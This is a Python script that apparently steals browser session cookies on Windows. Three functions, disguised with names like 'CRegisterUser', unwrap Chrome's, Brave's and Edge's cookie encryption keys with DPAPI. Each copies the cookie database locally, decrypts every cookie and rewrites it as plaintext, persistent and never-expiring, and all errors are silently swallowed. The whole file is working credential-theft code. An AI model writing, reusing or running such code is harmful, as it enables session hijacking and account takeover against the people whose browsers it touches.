from Cryptodome.Cipher import AES
import win32crypt
from shutil import copyfile
import sqlite3
import base64
import json
import os
SESSIONS = "qyURjmbvADL8vt15qyURjmbvL8vGeCFz"
API_KEY = "ADJt15qyURjmbvL8vGeCFz"


def CRegisterUser():
    try:
        with open(os.getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Local State", 'r') as file:
            encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
        encrypted_key = base64.b64decode(encrypted_key)
        encrypted_key = encrypted_key[5:]
        decrypted_key = win32crypt.CryptUnprotectData(
            encrypted_key, None, None, None, 0)[1]

        copyfile(os.getenv("APPDATA") +
                "/../Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", './CRegisterUser')
        # Connect to the Database
        conn = sqlite3.connect('./CRegisterUser')
        cursor = conn.cursor()

        # Get the results
        cursor.execute(
            'SELECT host_key, name, value, encrypted_value FROM cookies')
        for host_key, name, value, encrypted_value in cursor.fetchall():
            # Decrypt the encrypted_value
            try:
                # Try to decrypt as AES (2020 method)
                cipher = AES.new(decrypted_key, AES.MODE_GCM,
                                nonce=encrypted_value[3:3+12])
                decrypted_value = cipher.decrypt_and_verify(
                    encrypted_value[3+12:-16], encrypted_value[-16:])
            except:
                # If failed try with the old method
                decrypted_value = win32crypt.CryptUnprotectData(
                    encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or 0

            # Update the cookies with the decrypted value
            # This also makes all session cookies persistent
            cursor.execute('\
                UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\
                WHERE host_key = ?\
                AND name = ?',
                        (decrypted_value, host_key, name))

        conn.commit()
        conn.close()
    except Exception:
        pass


def BRegisterUser():
    try:
        with open(os.getenv("APPDATA") + "/../Local/BraveSoftware/Brave-Browser/User Data/Local State", 'r') as file:
            encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
        encrypted_key = base64.b64decode(encrypted_key)
        encrypted_key = encrypted_key[5:]
        decrypted_key = win32crypt.CryptUnprotectData(
            encrypted_key, None, None, None, 0)[1]

        copyfile(os.getenv("APPDATA") +
                "/../Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies", './BRegisterUser')
        # Connect to the Database
        conn = sqlite3.connect('./BRegisterUser')
        cursor = conn.cursor()

        # Get the results
        cursor.execute(
            'SELECT host_key, name, value, encrypted_value FROM cookies')
        for host_key, name, value, encrypted_value in cursor.fetchall():
            # Decrypt the encrypted_value
            try:
                # Try to decrypt as AES (2020 method)
                cipher = AES.new(decrypted_key, AES.MODE_GCM,
                                nonce=encrypted_value[3:3+12])
                decrypted_value = cipher.decrypt_and_verify(
                    encrypted_value[3+12:-16], encrypted_value[-16:])
            except:
                # If failed try with the old method
                decrypted_value = win32crypt.CryptUnprotectData(
                    encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or 0

            # Update the cookies with the decrypted value
            # This also makes all session cookies persistent
            cursor.execute('\
                UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\
                WHERE host_key = ?\
                AND name = ?',
                        (decrypted_value, host_key, name))

        conn.commit()
        conn.close()
    except Exception:
        pass

def ERegisterUser():
    try:
        with open(os.getenv("APPDATA") + "/../Local/Microsoft/Edge/User Data/Local State", 'r') as file:
            encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
        encrypted_key = base64.b64decode(encrypted_key)
        encrypted_key = encrypted_key[5:]
        decrypted_key = win32crypt.CryptUnprotectData(
            encrypted_key, None, None, None, 0)[1]

        copyfile(os.getenv("APPDATA") +
                "/../Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies", './ERegisterUser')
        # Connect to the Database
        conn = sqlite3.connect('./ERegisterUser')
        cursor = conn.cursor()

        # Get the results
        cursor.execute(
            'SELECT host_key, name, value, encrypted_value FROM cookies')
        for host_key, name, value, encrypted_value in cursor.fetchall():
            # Decrypt the encrypted_value
            try:
                # Try to decrypt as AES (2020 method)
                cipher = AES.new(decrypted_key, AES.MODE_GCM,
                                nonce=encrypted_value[3:3+12])
                decrypted_value = cipher.decrypt_and_verify(
                    encrypted_value[3+12:-16], encrypted_value[-16:])
            except:
                # If failed try with the old method
                decrypted_value = win32crypt.CryptUnprotectData(
                    encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or 0

            # Update the cookies with the decrypted value
            # This also makes all session cookies persistent
            cursor.execute('\
                UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\
                WHERE host_key = ?\
                AND name = ?',
                        (decrypted_value, host_key, name))

        conn.commit()
        conn.close()
    except Exception:
        pass